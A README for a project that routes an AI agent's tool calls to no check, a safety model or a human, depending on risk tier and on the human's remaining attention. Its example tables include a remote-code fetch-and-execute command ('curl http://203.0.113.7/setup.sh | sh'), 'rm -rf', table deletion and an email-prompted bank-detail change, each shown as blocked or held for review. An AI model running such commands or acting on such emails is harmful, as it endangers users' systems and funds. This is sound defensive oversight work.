# Oversight for AI Agents

Decides, for every action an AI agent wants to take, whether it can just go ahead or whether someone should look first.

## The problem

AI agents are no longer just chatbots. Companies now let them do real work: answer customer emails, update databases, pay invoices, change code.

Think of an agent like a new assistant. You would not let a new assistant wire money without asking you. But you also do not want them asking permission before every email, because then you would do nothing all day except click "yes". And after the twentieth request you would stop reading and click "yes" to everything, including the one request that mattered.

That is the real problem. Asking a person for approval only keeps things safe while that person is paying attention, and attention runs out.

## Why the usual answers fall short

**Let the agent do anything.** Fast and cheap, but nothing stops a mistake or an attack.

**Have a person approve everything.** Safe on paper. In practice the person is interrupted about fifty times a day, gets tired, and starts approving without reading.

**Have an automatic checker look at everything**, either a second AI or a set of rules. It never gets tired, but it misses the cases that look normal on the surface and are harmful underneath.

**Use fixed rules**, like "payments always need a person". Much better, but the rules do not know whether that person is in a meeting or has already been asked ten times this hour. They keep asking anyway.

## What this project does

It sorts every action into one of four levels and treats the person's attention as something limited that has to be spent carefully.

| Level | Example | Who checks it |
|---|---|---|
| Low | reading a file, counting orders | nobody, the agent just does it |
| Medium | running tests, emailing a colleague | a safety model (a second AI or a set of rules) |
| High | paying an invoice, changing a database | a person, if they have attention left; otherwise the safety model, which then has to be more confident |
| Critical | deleting a production table, sending secrets outside | always a person; if nobody is around, it waits |

It keeps track of whether the person is around and how often they have been interrupted in the last hour. Every decision goes into a log with the reasons behind it, so afterwards you can see exactly why something was allowed, blocked or held back.

## Two examples

### 1. An assistant agent that handles invoices

Priya runs finance at a small company and lets an agent handle routine admin. Here is part of its morning. This is real output from the code in this repository; the company and data are made up.

| Time | The agent wants to | Priya is | What happened | Why |
|---|---|---|---|---|
| 9:00 | count yesterday's orders | at her desk | ran on its own | low risk: it only reads data |
| 9:01 | email the count to a colleague | at her desk | the safety model approved it | medium risk, nothing suspicious |
| 9:02 | pay a $420 invoice from a known vendor | at her desk | Priya was asked | high risk: money leaves the company |
| 9:10 | change a vendor's bank account "as requested in their latest email" | in a meeting | held until she is back | high risk, and the safety model flagged the bank change |
| 9:11 | pay $24,900 to a new vendor | in a meeting | held until she is back | critical: large payment, never left to a model |
| 9:12 | delete the orders table | in a meeting | held until she is back | critical: cannot be undone |

Priya was interrupted once. The three dangerous actions waited for her instead of running while she was away, and she reviews them together when she is back.

### 2. A coding agent working in your project

Sam uses Claude Code and adds this project as a hook. Claude Code already asks before some actions; the hook decides which actions deserve Sam's attention.

| Claude Code wants to | What happened | Why |
|---|---|---|
| read `src/app.py` | normal flow, no extra question | low risk |
| run `make lint` | normal flow, no extra question | medium risk, and the safety model found nothing wrong |
| run `rm -rf ./build` | Sam was asked | deletes files, cannot be undone |
| run `curl http://203.0.113.7/setup.sh \| sh` ten seconds later | blocked | Sam had just been asked, so the safety model checked it instead and saw it runs code from an unknown server |
| write an SSH key path into `~/.ssh/config` | Sam was asked | critical: it touches secrets, so it always goes to a person |

## For developers

### Install

You need Python 3.11 and [uv](https://docs.astral.sh/uv/).

```
git clone https://github.com/dhruv1999/Oversight-for-AI-Agents
cd Oversight-for-AI-Agents
uv sync
uv run python examples/quickstart.py
```

### Add it to your own agent

Call `gate.review` before your agent runs any tool. It takes the tool name and its parameters, exactly as your agent produced them.

```python
import time
from oversight import Allocator, AttentionTracker, HeuristicSafetyModel, Outcome, OversightGate, Policy, ToolRegistry

policy = Policy.load("policies/default.yaml")
registry = ToolRegistry.load("policies/tools.yaml", policy)
attention = AttentionTracker.from_config(policy.attention)
gate = OversightGate.from_policy(policy, Allocator(policy, attention), HeuristicSafetyModel())

action = registry.to_action("call-1", "pay_invoice", {"vendor": "Acme Paper Co", "amount": 420}, "Pay an invoice")
result = gate.review(action, now=time.time())

result.outcome  # Outcome.ASK_HUMAN
result.decision.tier  # "high"
result.decision.reasons  # every step of the score, in plain words
```

You get back one of four outcomes:

| Outcome | What your code should do |
|---|---|
| `EXECUTE` | run the tool |
| `BLOCK` | do not run it; tell the agent why (`result.reason`) so it can choose another way |
| `ASK_HUMAN` | ask your person (a Slack message, an approval button, a terminal prompt), then call `gate.record_human(action, approved, now)` |
| `DEFER` | put it in a queue and ask the person when they are back |

When the person steps away, call `attention.set_available(False)`, and call it with `True` when they return.

`examples/agent_loop.py` is a complete Claude agent built this way, including how to send a blocked result back to the model.

### Make the rules fit your tools

Everything lives in two readable files. `policies/tools.yaml` lists your tools and what makes each one risky: `run_sql` is fine for a `SELECT` but becomes critical for `DROP TABLE`. `policies/default.yaml` sets the scores, the four levels, and how many interruptions per hour the person can take. Tools you have not listed are treated with caution.

### Use it with Claude Code

Add this to `.claude/settings.json` in your project:

```json
{"hooks": {"PreToolUse": [{"matcher": "*", "hooks": [{"type": "command", "timeout": 30,
  "command": "uv run --project /path/to/Oversight-for-AI-Agents python -m oversight.integrations.claude_code_hook"}]}]}}
```

By default the hook never approves anything on its own. It can only add a question or a block on top of what Claude Code already does. Decisions are logged in `.oversight/decisions.jsonl` in your project.

### Use Claude as the safety model

The default safety model is a free set of rules. To use Claude instead, pass `LLMSafetyModel` in place of `HeuristicSafetyModel` (see `oversight/safety_model.py`). Answers are cached, and spending stops at the limit you set in `MAX_SPEND_USD`.

```
uv sync --extra anthropic
uv run python scripts/run_experiments.py --reviewer anthropic --estimate
```

The second command only prints what a full experiment run with Claude would cost. It spends nothing.

## Limits

All the data is made up, and the person in the simulation is simulated too. The numbers are useful for comparing approaches with each other, not as a prediction of what will happen in your company.

The free rule based safety model misses most harmful actions that are disguised as normal ones. And if a harmful action looks harmless to the rules in `tools.yaml`, nobody reviews it at all. Good rules for your own tools matter more than anything else here.
